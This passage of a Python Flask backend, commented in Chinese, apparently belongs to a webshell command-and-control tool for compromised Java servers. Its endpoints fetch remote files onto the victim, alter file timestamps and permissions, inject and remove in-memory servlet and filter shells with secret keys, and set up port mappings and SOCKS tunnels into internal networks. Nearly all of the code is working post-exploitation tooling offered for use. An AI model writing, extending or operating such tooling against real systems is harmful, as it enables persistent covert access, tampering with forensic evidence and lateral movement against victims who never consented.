            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        if not download_url:
            return jsonify({'status': 'error', 'message': '下载URL不能为空'}), 400
        if not save_path:
            return jsonify({'status': 'error', 'message': '保存路径不能为空'}), 400
        
        print(f"[DEBUG] 远程下载文件请求: {download_url} -> {save_path}")
        
        # 获取webshell实例
        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'Webshell实例创建失败'}), 500
        
        # 执行远程下载操作
        result = shell.file_remote_download(download_url, save_path)
        
        if result:
            return jsonify({
                'status': 'success',
                'message': '远程文件下载成功',
                'data': {
                    'downloadUrl': download_url,
                    'savePath': save_path
                }
            })
        else:
            return jsonify({
                'status': 'error',
                'message': '远程文件下载失败'
            }), 500
            
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500


@java_shell_bp.route('/setFileAttr', methods=['POST'])
def set_file_attr():
    """设置文件属性（权限或时间）"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        webshell_id = data.get('webshell_id')
        file_path = data.get('filePath')
        attr_type = data.get('attrType')  # 'permission' 或 'time'
        
        # 参数验证
        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        if not file_path:
            return jsonify({'status': 'error', 'message': '文件路径不能为空'}), 400
        if not attr_type:
            return jsonify({'status': 'error', 'message': '属性类型不能为空'}), 400
        if attr_type not in ['permission', 'time']:
            return jsonify({'status': 'error', 'message': '属性类型必须是permission或time'}), 400
        
        print(f"[DEBUG] 设置文件属性请求: {file_path}, 类型: {attr_type}")
        
        # 获取webshell实例
        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'Webshell实例创建失败'}), 500
        
        if attr_type == 'permission':
            # 修改文件权限
            permission = data.get('permission')
            if not permission:
                return jsonify({'status': 'error', 'message': '权限属性不能为空'}), 400
            
            # 验证权限格式（只允许R、W、X的组合）
            import re
            if not re.match(r'^[RWXrwx]+$', permission):
                return jsonify({'status': 'error', 'message': '权限格式无效，只允许RWX字母组合'}), 400
            
            # 转换为大写
            permission = permission.upper()
            
            print(f"[DEBUG] 设置文件权限: {file_path} -> {permission}")
            result = shell.set_file_permission(file_path, permission)
            
            if result:
                return jsonify({
                    'status': 'success',
                    'message': '文件权限设置成功',
                    'data': {
                        'filePath': file_path,
                        'permission': permission,
                        'attrType': 'permission'
                    }
                })
            else:
                return jsonify({
                    'status': 'error',
                    'message': '文件权限设置失败'
                }), 500
                
        elif attr_type == 'time':
            # 修改文件时间
            modify_time = data.get('modifyTime')
            access_time = data.get('accessTime')
            
            # 至少需要一个时间参数
            if not modify_time and not access_time:
                return jsonify({'status': 'error', 'message': '至少需要提供一个时间参数'}), 400
            
            # 构造时间列表
            time_list = []
            
            # 修改时间
            if modify_time and modify_time.strip():
                # 验证时间格式
                try:
                    import datetime
                    datetime.datetime.strptime(modify_time, "%Y-%m-%d %H:%M:%S")
                    time_list.append(modify_time)
                except ValueError:
                    return jsonify({'status': 'error', 'message': '修改时间格式无效，请使用：YYYY-MM-DD HH:MM:SS'}), 400
            else:
                time_list.append("none")
            
            # 访问时间
            if access_time and access_time.strip():
                # 验证时间格式
                try:
                    import datetime
                    datetime.datetime.strptime(access_time, "%Y-%m-%d %H:%M:%S")
                    time_list.append(access_time)
                except ValueError:
                    return jsonify({'status': 'error', 'message': '访问时间格式无效，请使用：YYYY-MM-DD HH:MM:SS'}), 400
            else:
                time_list.append("none")
            
            print(f"[DEBUG] 设置文件时间: {file_path} -> 修改时间: {time_list[0]}, 访问时间: {time_list[1]}")
            result = shell.set_file_time(file_path, time_list)
            
            if result:
                return jsonify({
                    'status': 'success',
                    'message': '文件时间设置成功',
                    'data': {
                        'filePath': file_path,
                        'modifyTime': modify_time if modify_time and modify_time.strip() else None,
                        'accessTime': access_time if access_time and access_time.strip() else None,
                        'attrType': 'time'
                    }
                })
            else:
                return jsonify({
                    'status': 'error',
                    'message': '文件时间设置失败'
                }), 500
            
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500



# ====== 内存马管理接口 ======

@java_shell_bp.route('/loadMemoryShell', methods=['POST'])
def load_memory_shell():
    """加载内存马"""
    try:
        data = request.get_json()
        
        # 验证必需参数
        required_params = ['webshell_id', 'memoryShellPath', 'memoryShellSecretKey', 'memoryShellParamName', 'memoryShellPayload']
        for param in required_params:
            if not data.get(param):
                return jsonify({'status': 'error', 'message': f'缺少必需参数: {param}'}), 400
        
        webshell_id = data['webshell_id']
        memory_shell_path = data['memoryShellPath']
        memory_shell_secret_key = data['memoryShellSecretKey']
        memory_shell_param_name = data['memoryShellParamName']
        memory_shell_payload = data['memoryShellPayload']
        memory_shell_cookie_name = data.get('memoryShellCookieName', '')
        memory_shell_cookie_value = data.get('memoryShellCookieValue', '')
        
        print(f"[INFO] 开始加载内存马: {memory_shell_path}")
        print(f"[DEBUG] 内存马配置: 路径={memory_shell_path}, 密钥={memory_shell_secret_key}, 参数名={memory_shell_param_name}, 类型={memory_shell_payload}")
        
        # 获取webshell实例
        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'webshell连接失败'}), 500
        
        # 检查是否为JavaShell类型
        if not hasattr(shell, 'load_memory_shell'):
            return jsonify({'status': 'error', 'message': '当前webshell类型不支持内存马功能'}), 400
        
        
        # 1. 获取内存马payload类
        print(f"[DEBUG] 获取内存马payload类: {memory_shell_payload}")
        memory_shell_class_info = java_payload.getPayload(class_name=memory_shell_payload)
        
        if not memory_shell_class_info:
            return jsonify({'status': 'error', 'message': f'无法获取内存马payload类: {memory_shell_payload}'}), 500
        
        # 2. 确保内存马类已加载到webshell内存
        success, class_name, error_msg = ensure_payload_loaded(shell, memory_shell_class_info, memory_shell_payload, '加载内存马类失败')
        if not success:
            return jsonify({'status': 'error', 'message': error_msg}), 500
        
        # 3. 执行加载内存马操作
        print(f"[DEBUG] 执行加载内存马操作")
        
        result = shell.load_memory_shell(
            param=memory_shell_param_name,
            secretKey=memory_shell_secret_key,
            path=memory_shell_path,
            className=class_name,
            cookie_name=memory_shell_cookie_name,
        )
        
        if result[0]:
            print(f"[SUCCESS] 内存马 {result[1]} 加载成功")
            
            # 记录内存马信息到webshell实例
            if not hasattr(shell, 'memory_shells'):
                shell.memory_shells = {}
            
            shell.memory_shells[memory_shell_path] = {
                'path': memory_shell_path,
                'secretKey': memory_shell_secret_key,
                'paramName': memory_shell_param_name,
                'payload': memory_shell_payload,
                'className': class_name,
                'cookie_name': memory_shell_cookie_name,
                'cookie_value': memory_shell_cookie_value,
                'component_name': result[1],
                'loadTime': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                'active': True
            }
            
            return jsonify({
                'status': 'success',
                'message': '内存马加载成功',
                'data': {
                    'path': memory_shell_path,
                    'payload': memory_shell_payload,
                    'className': class_name,
                    'loadTime': shell.memory_shells[memory_shell_path]['loadTime'],
                    'cookie_name': memory_shell_cookie_name,
                    'cookie_value': memory_shell_cookie_value,
                    'component_name': result[1]
                }
            })
        else:
            return jsonify({
                'status': 'error',
                'message': '内存马加载失败'
            }), 500
        
    except Exception as e:
        print(f"[ERROR] 加载内存马失败: {e}")
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500


@java_shell_bp.route('/unloadMemoryShell', methods=['POST'])
def unload_memory_shell():
    """卸载内存马"""
    try:
        data = request.get_json()
        
        # 验证必需参数
        required_params = ['webshell_id', 'type']
        for param in required_params:
            if not data.get(param):
                return jsonify({'status': 'error', 'message': f'缺少必需参数: {param}'}), 400
        
        webshell_id = data['webshell_id']
        unload_type = data['type']  # 'servlet' 或 'filter'
        
        # 根据类型验证特定参数
        if unload_type == 'servlet':
            if not data.get('urlPattern') or not data.get('wrapperName'):
                return jsonify({'status': 'error', 'message': 'Servlet类型需要提供urlPattern和wrapperName参数'}), 400
            url_pattern = data['urlPattern']
            component_name = data['wrapperName']
        elif unload_type == 'filter':
            if not data.get('filterName'):
                return jsonify({'status': 'error', 'message': 'Filter类型需要提供filterName参数'}), 400
            url_pattern = ""  # filter类型不需要urlPattern
            component_name = data['filterName']
        else:
            return jsonify({'status': 'error', 'message': 'type参数必须是servlet或filter'}), 400
        
        print(f"[INFO] 开始卸载{unload_type}类型内存马: {component_name}")
        
        # 获取webshell实例
        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'webshell连接失败'}), 500
        
        # 检查是否为JavaShell类型
        if not hasattr(shell, 'unload_memory_shell'):
            return jsonify({'status': 'error', 'message': '当前webshell类型不支持内存马功能'}), 400
        
        memory_shell_manage_class_info = java_payload.getPayload(class_name="MemoryShellManage")
        
        if not memory_shell_manage_class_info:
            return jsonify({'status': 'error', 'message': '无法获取MemoryShellManage payload类'}), 500
        
        # 确保MemoryShellManage类已加载
        success, memory_shell_manage_classname, error_msg = ensure_payload_loaded(shell, memory_shell_manage_class_info, "MemoryShellManage", '加载MemoryShellManage类失败')
        if not success:
            return jsonify({'status': 'error', 'message': error_msg}), 500
        
        # 执行卸载操作
        print(f"[DEBUG] 执行{unload_type}卸载操作: urlPattern={url_pattern}, componentName={component_name}, className={memory_shell_manage_classname}")
        
        result, result_message = shell.unload_memory_shell(
            urlPattern=url_pattern,
            componentName=component_name,
            className=memory_shell_manage_classname,
            method=unload_type
        )
        
        if result:
            print(f"[SUCCESS] {unload_type}内存马卸载成功: {component_name}")
            
            return jsonify({
                'status': 'success',
                'message': f'{unload_type}内存马卸载成功',
                'data': {
                    'type': unload_type,
                    'componentName': component_name,
                    'urlPattern': url_pattern if unload_type == 'servlet' else None,
                    'unloadTime': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                }
            })
        else:
            # 不要返回500状态码，这样前端才能正确解析到具体的错误消息
            return jsonify({
                'status': 'error',
                'message': f'{unload_type}内存马卸载失败: {result_message}'
            })
        
    except Exception as e:
        print(f"[ERROR] 卸载内存马失败: {e}")
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500


@java_shell_bp.route('/getAllServlet', methods=['POST'])
def get_all_servlet():
    """获取所有Servlet"""
    try:
        data = request.get_json()
        
        # 验证必需参数
        required_params = ['webshell_id']
        for param in required_params:
            if not data.get(param):
                return jsonify({'status': 'error', 'message': f'缺少必需参数: {param}'}), 400
        
        webshell_id = data['webshell_id']
        
        print(f"[INFO] 开始获取所有Servlet: {webshell_id}")
        
        # 获取webshell实例
        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'webshell连接失败'}), 500
        
        # 检查是否为JavaShell类型
        if not hasattr(shell, 'get_shell_info'):
            return jsonify({'status': 'error', 'message': '当前webshell类型不支持Servlet查询功能'}), 400
        
        memory_shell_manage_class_info = java_payload.getPayload(class_name="MemoryShellManage")
        
        if not memory_shell_manage_class_info:
            return jsonify({'status': 'error', 'message': '无法获取MemoryShellManage payload类'}), 500
        
        # 确保MemoryShellManage类已加载
        success, memory_shell_manage_classname, error_msg = ensure_payload_loaded(shell, memory_shell_manage_class_info, "MemoryShellManage", '加载MemoryShellManage类失败')
        if not success:
            return jsonify({'status': 'error', 'message': error_msg}), 500
        
        # 执行获取所有内存马信息操作
        print(f"[DEBUG] 执行获取所有内存马信息操作，使用类名: {memory_shell_manage_classname}")
        
        shell_info = shell.get_shell_info(memory_shell_manage_classname)
        
        if shell_info:
            print(f"[SUCCESS] 获取所有内存马信息成功")
            
            # 解析内存马信息，包含servlet和filter
            servlet_list = []
            filter_list = []
            lines = shell_info.strip().split('\n')
            
            current_section = None
            for i, line in enumerate(lines):
                line = line.strip()
                if line == "=== SERVLETS ===":
                    current_section = "servlets"
                    continue
                elif line == "=== FILTERS ===":
                    current_section = "filters"
                    continue
                elif line and '|' in line and current_section:
                    parts = line.split('|')
                    if current_section == "servlets" and len(parts) >= 3:
                        servlet_list.append({
                            'url': parts[0].strip(),
                            'wrapperName': parts[1].strip(),
                            'servletClass': parts[2].strip()
                        })
                        
                    elif current_section == "filters" and len(parts) >= 2:
                        if len(parts) == 2:
                            # 新格式：filterName | urlPatterns
                            filter_data = {
                                'filterName': parts[0].strip(),
                                'urlPatterns': parts[1].strip()
                            }
                            filter_list.append(filter_data)
                            
                        elif len(parts) >= 3:
                            # 旧格式：filterName | servletNames | urlPatterns
                            filter_data = {
                                'filterName': parts[0].strip(),
                                'urlPatterns': parts[2].strip()  # 使用第3列作为urlPatterns
                            }
                            filter_list.append(filter_data)
                            
                    
            return jsonify({
                'status': 'success',
                'message': '获取所有内存马信息成功',
                'data': {
                    'servletCount': len(servlet_list),
                    'servletList': servlet_list,
                    'filterCount': len(filter_list),
                    'filterList': filter_list,
                    'rawData': shell_info  # 原始数据，便于调试
                }
            })
        else:
            return jsonify({
                'status': 'error',
                'message': '获取所有内存马信息失败'
            }), 500
        
    except Exception as e:
        print(f"[ERROR] 获取所有内存马信息失败: {e}")
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500


@java_shell_bp.route('/checkMemoryShellStatus', methods=['POST'])
def check_memory_shell_status():
    """检查内存马状态"""
    try:
        data = request.get_json()
        
        # 验证必需参数
        required_params = ['webshell_id', 'memoryShellPath']
        for param in required_params:
            if not data.get(param):
                return jsonify({'status': 'error', 'message': f'缺少必需参数: {param}'}), 400
        
        webshell_id = data['webshell_id']
        memory_shell_path = data['memoryShellPath']
        
        print(f"[INFO] 检查内存马状态: {memory_shell_path}")
        
        # 获取webshell实例
        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'webshell连接失败'}), 500
        
        # 检查内存马记录
        if hasattr(shell, 'memory_shells') and memory_shell_path in shell.memory_shells:
            memory_shell_info = shell.memory_shells[memory_shell_path]
            
            return jsonify({
                'status': 'success',
                'data': {
                    'active': memory_shell_info.get('active', False),
                    'path': memory_shell_info.get('path'),
                    'payload': memory_shell_info.get('payload'),
                    'className': memory_shell_info.get('className'),
                    'loadTime': memory_shell_info.get('loadTime'),
                    'paramName': memory_shell_info.get('paramName'),
                    'secretKey': memory_shell_info.get('secretKey'),
                    'cookie_name': memory_shell_info.get('cookie_name'),
                    'cookie_value': memory_shell_info.get('cookie_value'),
                    'component_name': memory_shell_info.get('component_name')
                }
            })
        else:
            return jsonify({
                'status': 'success',
                'data': {
                    'active': False,
                    'path': memory_shell_path,
                    'payload': None,
                    'loadTime': None
                }
            })
        
    except Exception as e:
        print(f"[ERROR] 检查内存马状态失败: {e}")
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500


# ====== 内存马历史记录管理接口 ======
def get_history_file_path(webshell_url):
    """根据webshell URL生成历史记录文件路径"""
    # 创建历史记录存储目录
    history_dir = os.path.join(os.path.dirname(__file__), 'data/memory_shell_history')
    os.makedirs(history_dir, exist_ok=True)
    
    # 使用URL的hash值作为文件名
    url_hash = hashlib.md5(webshell_url.encode('utf-8')).hexdigest()
    return os.path.join(history_dir, f'{url_hash}.json')


def load_history_from_file(webshell_url):
    """从文件加载历史记录"""
    try:
        file_path = get_history_file_path(webshell_url)
        if os.path.exists(file_path):
            with open(file_path, 'r', encoding='utf-8') as f:
                return json.load(f)
        return []
    except Exception as e:
        print(f"[ERROR] 加载历史记录失败: {e}")
        return []


def save_history_to_file(webshell_url, history_data):
    """保存历史记录到文件"""
    try:
        file_path = get_history_file_path(webshell_url)
        with open(file_path, 'w', encoding='utf-8') as f:
            json.dump(history_data, f, ensure_ascii=False, indent=2)
        return True
    except Exception as e:
        print(f"[ERROR] 保存历史记录失败: {e}")
        return False


@java_shell_bp.route('/saveMemoryShellHistory', methods=['POST'])
def save_memory_shell_history():
    """保存内存马历史记录"""
    try:
        data = request.json
        webshell_url = data.get('webshell_url')
        history_item = data.get('history_item')
        
        if not webshell_url or not history_item:
            return jsonify({
                'status': 'error',
                'message': '缺少必要参数'
            }), 400
        
        # 加载现有历史记录
        history_list = load_history_from_file(webshell_url)
        
        # 检查是否存在重复记录（基于路径和时间）
        path = history_item.get('path')
        create_time = history_item.get('createTime')
        
        # 避免重复记录
        exists = False
        for item in history_list:
            if (item.get('path') == path and 
                abs(time.mktime(time.strptime(create_time, '%Y/%m/%d %H:%M:%S')) - 
                    time.mktime(time.strptime(item.get('createTime', ''), '%Y/%m/%d %H:%M:%S'))) < 10):
                exists = True
                break
        
        if not exists:
            # 添加到历史记录
            history_list.insert(0, history_item)  # 最新的在前面
            
            # 限制历史记录数量，最多保存50条
            if len(history_list) > 50:
                history_list = history_list[:50]
            
            # 保存到文件
            if save_history_to_file(webshell_url, history_list):
                return jsonify({
                    'status': 'success',
                    'message': '历史记录保存成功'
                })
            else:
                return jsonify({
                    'status': 'error',
                    'message': '保存历史记录失败'
                }), 500
        else:
            return jsonify({
                'status': 'success',
                'message': '记录已存在，未重复保存'
            })
        
    except Exception as e:
        print(f"[ERROR] 保存内存马历史记录失败: {e}")
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500


@java_shell_bp.route('/getMemoryShellHistory', methods=['POST'])
def get_memory_shell_history():
    """获取内存马历史记录"""
    try:
        data = request.json
        webshell_url = data.get('webshell_url')
        
        if not webshell_url:
            return jsonify({
                'status': 'error',
                'message': '缺少webshell_url参数'
            }), 400
        
        # 加载历史记录
        history_list = load_history_from_file(webshell_url)
        
        return jsonify({
            'status': 'success',
            'message': '获取历史记录成功',
            'data': history_list
        })
        
    except Exception as e:
        print(f"[ERROR] 获取内存马历史记录失败: {e}")
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500


@java_shell_bp.route('/deleteMemoryShellHistory', methods=['POST'])
def delete_memory_shell_history():
    """删除单条内存马历史记录"""
    try:
        data = request.json
        webshell_url = data.get('webshell_url')
        record_id = data.get('record_id')
        
        if not webshell_url or not record_id:
            return jsonify({
                'status': 'error',
                'message': '缺少必要参数'
            }), 400
        
        # 加载现有历史记录
        history_list = load_history_from_file(webshell_url)
        
        # 删除指定记录
        updated_history = [item for item in history_list if item.get('id') != record_id]
        
        if len(updated_history) == len(history_list):
            return jsonify({
                'status': 'error',
                'message': '未找到要删除的记录'
            }), 404
        
        # 保存更新后的历史记录
        if save_history_to_file(webshell_url, updated_history):
            return jsonify({
                'status': 'success',
                'message': '记录删除成功'
            })
        else:
            return jsonify({
                'status': 'error',
                'message': '删除记录失败'
            }), 500
        
    except Exception as e:
        print(f"[ERROR] 删除内存马历史记录失败: {e}")
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500


@java_shell_bp.route('/clearMemoryShellHistory', methods=['POST'])
def clear_memory_shell_history():
    """清空内存马历史记录"""
    try:
        data = request.json
        webshell_url = data.get('webshell_url')
        
        if not webshell_url:
            return jsonify({
                'status': 'error',
                'message': '缺少webshell_url参数'
            }), 400
        
        # 清空历史记录（保存空列表）
        if save_history_to_file(webshell_url, []):
            return jsonify({
                'status': 'success',
                'message': '历史记录已清空'
            })
        else:
            return jsonify({
                'status': 'error',
                'message': '清空历史记录失败'
            }), 500
        
    except Exception as e:
        print(f"[ERROR] 清空内存马历史记录失败: {e}")
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500


# ====== 内网穿透 - 端口映射接口 ======

@java_shell_bp.route('/startPortMapping', methods=['POST'])
def start_port_mapping():
    """启动端口映射"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        # 验证必需参数
        required_params = ['webshell_id', 'localPort', 'targetIp', 'targetPort']
        for param in required_params:
            if not data.get(param):
                return jsonify({'status': 'error', 'message': f'缺少必需参数: {param}'}), 400
        
        webshell_id = data['webshell_id']
        local_port = int(data['localPort'])
        target_ip = data['targetIp']
        target_port = int(data['targetPort'])
        
        print(f"[INFO] 启动端口映射: {local_port} -> {target_ip}:{target_port}")
        
        # 获取webshell实例
        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'webshell连接失败'}), 500
        
        # 检查是否为JavaShell类型
        if not hasattr(shell, 'create_port_mapping'):
            return jsonify({'status': 'error', 'message': '当前webshell类型不支持端口映射功能'}), 400
        
        portmapping_class_info = java_payload.getPayload(class_name="PortMapping")
        
        if not portmapping_class_info:
            return jsonify({'status': 'error', 'message': '无法获取PortMapping payload类'}), 500
        
        # 确保PortMapping类已加载
        success, portmapping_classname, error_msg = ensure_payload_loaded(shell, portmapping_class_info, "PortMapping", 'PortMapping类加载失败')
        if not success:
            return jsonify({'status': 'error', 'message': error_msg}), 500
        
        # 生成service的唯一key（使用webshell_id作为key更简单）
        service_key = webshell_id
        
        # 获取或创建PortMappingService实例
        if service_key not in port_mapping_services:
            try:
                from .java.PortMappingService_v2 import PortMappingService
                service = PortMappingService(shell, portmapping_classname)
                port_mapping_services[service_key] = service
                print(f"[DEBUG] PortMappingService实例已创建并缓存")
            except ImportError:
                return jsonify({
                    'status': 'error',
                    'message': 'PortMappingService模块不可用，端口映射功能暂不支持'
                }), 500
        else:
            service = port_mapping_services[service_key]
            print(f"[DEBUG] 重用现有的PortMappingService实例")
        
        # 创建端口映射
        success = service.create_mapping(local_port, target_ip, target_port)
        
        if success:
            return jsonify({
                'status': 'success',
                'message': '端口映射启动成功',
                'data': {
                    'localPort': local_port,
                    'targetIp': target_ip,
                    'targetPort': target_port,
                    'mapping': f"{local_port} -> {target_ip}:{target_port}"
                }
            })
        else:
            return jsonify({
                'status': 'error',
                'message': '端口映射启动失败，请检查端口是否已被占用或网络连接'
            }), 500
            
    except ValueError as e:
        return jsonify({
            'status': 'error',
            'message': f'参数格式错误: {str(e)}'
        }), 400
    except Exception as e:
        print(f"[ERROR] 启动端口映射失败: {e}")
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500


@java_shell_bp.route('/stopPortMapping', methods=['POST'])
def stop_port_mapping():
    """停止端口映射"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        # 验证必需参数
        required_params = ['webshell_id', 'localPort']
        for param in required_params:
            if not data.get(param):
                return jsonify({'status': 'error', 'message': f'缺少必需参数: {param}'}), 400
        
        webshell_id = data['webshell_id']
        local_port = int(data['localPort'])
        
        print(f"[INFO] 停止端口映射: {local_port}")
        
        # 获取PortMappingService实例
        service_key = webshell_id
        if service_key not in port_mapping_services:
            return jsonify({
                'status': 'error',
                'message': '端口映射服务未启动'
            }), 404
        
        service = port_mapping_services[service_key]
        
        # 停止端口映射
        success = service.remove_mapping(local_port)
        
        if success:
            return jsonify({
                'status': 'success',
                'message': '端口映射停止成功',
                'data': {
                    'localPort': local_port
                }
            })
        else:
            return jsonify({
                'status': 'error',
                'message': f'停止端口映射失败，端口 {local_port} 可能未在映射中'
            }), 500
            
    except ValueError as e:
        return jsonify({
            'status': 'error',
            'message': f'参数格式错误: {str(e)}'
        }), 400
    except Exception as e:
        print(f"[ERROR] 停止端口映射失败: {e}")
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500


@java_shell_bp.route('/getPortMappingStatus', methods=['POST'])
def get_port_mapping_status():
    """获取端口映射状态"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        # 验证必需参数
        required_params = ['webshell_id']
        for param in required_params:
            if not data.get(param):
                return jsonify({'status': 'error', 'message': f'缺少必需参数: {param}'}), 400
        
        webshell_id = data['webshell_id']
        
        print(f"[INFO] 获取端口映射状态")
        
        # 获取PortMappingService实例
        service_key = webshell_id
        if service_key not in port_mapping_services:
            return jsonify({
                'status': 'success',
                'message': '获取端口映射状态成功',
                'data': {
                    'total_mappings': 0,
                    'mappings': []
                }
            })
        
        service = port_mapping_services[service_key]
        
        # 获取所有映射状态
        status = service.get_all_mappings_status()
        
        return jsonify({
            'status': 'success',
            'message': '获取端口映射状态成功',
            'data': status
        })
            
    except Exception as e:
        print(f"[ERROR] 获取端口映射状态失败: {e}")
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500


@java_shell_bp.route('/stopAllPortMappings', methods=['POST'])
def stop_all_port_mappings():
    """停止所有端口映射"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        # 验证必需参数
        required_params = ['webshell_id']
        for param in required_params:
            if not data.get(param):
                return jsonify({'status': 'error', 'message': f'缺少必需参数: {param}'}), 400
        
        webshell_id = data['webshell_id']
        
        print(f"[INFO] 停止所有端口映射")
        
        # 获取PortMappingService实例
        service_key = webshell_id
        if service_key not in port_mapping_services:
            return jsonify({
                'status': 'success',
                'message': '没有活跃的端口映射需要停止'
            })
        
        service = port_mapping_services[service_key]
        
        # 停止所有映射
        service.close_all_mappings()
        
        # 清理服务实例
        del port_mapping_services[service_key]
        
        return jsonify({
            'status': 'success',
            'message': '所有端口映射已停止'
        })
            
    except Exception as e:
        print(f"[ERROR] 停止所有端口映射失败: {e}")
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500


# ====== 内网穿透 - Socks隧道接口 ======

@java_shell_bp.route('/startSocksTunnel', methods=['POST'])
def start_socks_tunnel():
    """启动Socks隧道"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        # 验证必需参数
        required_params = ['webshell_id', 'listenPort']
        for param in required_params:
            if not data.get(param):
                return jsonify({'status': 'error', 'message': f'缺少必需参数: {param}'}), 400
        
        webshell_id = data['webshell_id']
        listen_port = int(data['listenPort'])
        listen_ip = data.get('listenIp', '127.0.0.1')  # 默认只监听本地
        ip_whitelist = data.get('ipWhitelist', [])  # IP白名单，可选
        
        print(f"[INFO] 启动Socks隧道: {listen_ip}:{listen_port}")
        
        # 获取webshell实例
        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'webshell连接失败'}), 500
        
        # 检查是否为JavaShell类型
        if not hasattr(shell, 'create_tunnel'):
            return jsonify({'status': 'error', 'message': '当前webshell类型不支持Socks隧道功能'}), 400
        
        socks_class_info = java_payload.getPayload(class_name="SocksProxy")
        
        if not socks_class_info:
            return jsonify({'status': 'error', 'message': '无法获取SocksProxy payload类'}), 500
        
        # 确保SocksProxy类已加载
        success, socks_classname, error_msg = ensure_payload_loaded(shell, socks_class_info, "SocksProxy", 'SocksProxy类加载失败')
        if not success:
            return jsonify({'status': 'error', 'message': error_msg}), 500
        
        # 生成service的唯一key（使用webshell_id作为key更简单）
        service_key = webshell_id
        
        # 检查是否已经有隧道服务在运行
        if service_key in tunnel_services:
            existing_service = tunnel_services[service_key]
            if existing_service.is_running:
                return jsonify({
                    'status': 'error',
                    'message': f'该webshell已有Socks隧道在运行'
                }), 400
            else:
                # 清理旧的服务实例
                del tunnel_services[service_key]
        
        # 创建TunnelService实例
        try:
            from .java.SocksService import SocksService
            service = SocksService(shell, socks_classname, ip_whitelist)
            tunnel_services[service_key] = service
            
            # 在后台线程启动Socks服务器
            import threading
            server_thread = threading.Thread(
                target=service.start_socks_server,
                args=(listen_ip, listen_port),
                daemon=True,
                name=f"SocksTunnel-{listen_port}"
            )
            server_thread.start()
            
            # 等待一小会确保服务启动
            time.sleep(0.5)
            
            if service.is_running:
                return jsonify({
                    'status': 'success',
                    'message': 'Socks隧道启动成功',
                    'data': {
                        'listenIp': listen_ip,
                        'listenPort': listen_port,
                        'ipWhitelist': ip_whitelist,
                        'socksVersion': 'SOCKS5',
                        'proxy': f"socks5://{listen_ip}:{listen_port}"
                    }
                })
            else:
                # 服务启动失败，清理实例
                if service_key in tunnel_services:
                    del tunnel_services[service_key]
                return jsonify({
                    'status': 'error',
                    'message': f'Socks隧道启动失败，请检查端口 {listen_port} 是否已被占用'
                }), 500
        except ImportError:
            return jsonify({
                'status': 'error',
                'message': 'TunnelService模块不可用，Socks隧道功能暂不支持'
            }), 500
            
    except ValueError as e:
        return jsonify({
            'status': 'error',
            'message': f'参数格式错误: {str(e)}'
        }), 400
    except Exception as e:
        print(f"[ERROR] 启动Socks隧道失败: {e}")
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500


@java_shell_bp.route('/stopSocksTunnel', methods=['POST'])
def stop_socks_tunnel():
    """停止Socks隧道"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        # 验证必需参数
        required_params = ['webshell_id']
        for param in required_params:
            if not data.get(param):
                return jsonify({'status': 'error', 'message': f'缺少必需参数: {param}'}), 400
        
        webshell_id = data['webshell_id']
        
        print(f"[INFO] 停止Socks隧道")
        
        # 获取TunnelService实例
        service_key = webshell_id
        if service_key not in tunnel_services:
            return jsonify({
                'status': 'error',
                'message': 'Socks隧道服务未启动'
            }), 404
        
        service = tunnel_services[service_key]
        
        # 停止隧道服务
        service.stop_socks_server()
        
        # 清理服务实例
        del tunnel_services[service_key]
        
        return jsonify({
            'status': 'success',
            'message': 'Socks隧道已停止'
